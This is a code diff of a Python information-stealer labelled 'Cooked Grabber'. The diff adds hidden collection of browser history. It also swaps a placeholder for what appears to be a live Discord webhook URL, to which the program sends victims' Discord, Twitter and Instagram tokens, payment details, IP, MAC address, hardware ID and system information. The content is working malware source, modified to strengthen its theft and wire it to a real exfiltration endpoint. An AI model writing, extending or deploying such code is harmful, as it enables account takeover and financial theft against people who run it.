@@ -28,7 +28,7 @@ from zipfile import ZipFile, ZIP_DEFLATED
 website = ['discord.com', 'twitter.com', 'instagram.com']
 
 def get_hwid():
-    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    p = Popen('wmic csproduct get uuid', shell=True, stdout=PIPE, stderr=PIPE)
     return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]
 
 def get_user_data(tk):
@@ -263,6 +263,10 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
                     f.write(f"{i}\n")
             zip.write("Payment Info.txt")
             os.remove("Payment Info.txt")
+        with open('History.txt', 'w') as f:
+            SetFileAttributes("History.txt", win32con.FILE_ATTRIBUTE_HIDDEN), f.write(find_His())
+        zip.write("History.txt")
+        os.remove("History.txt")
         for name_f, _ in files_names:
             if os.path.exists(name_f):
                 zip.write(name_f)
@@ -271,7 +275,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
         webhook = DiscordWebhook(url=URL, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
         embed = DiscordEmbed(title='Cooked Grabber', color='00FF00')
         embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
-        embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{countries.get(name=p_lst[1]).alpha_2.lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid().strip()}**\n", inline=False)
+        embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{countries.get(name=p_lst[1]).alpha_2.lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
         embed.add_embed_field(name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
         embed.add_embed_field(name='ACCOUNT HACKED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n", inline=False)
         card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals() else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
@@ -290,7 +294,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
 
 if __name__ == "__main__":
     if len(sys.argv) == 1:
-        send_webhook(['YOUR DISCORD WEBHOOK URL'])
+        send_webhook(['https://discord.com/api/webhooks/999845921892343938/L_Dd29L7HSrOgOdwV58al1rN7yojRcBIc7hHgBw5pgvuuzivVXV5OtNxo9m6A8tKcl1-'])
     else:
         del sys.argv[0]
         send_webhook(sys.argv)
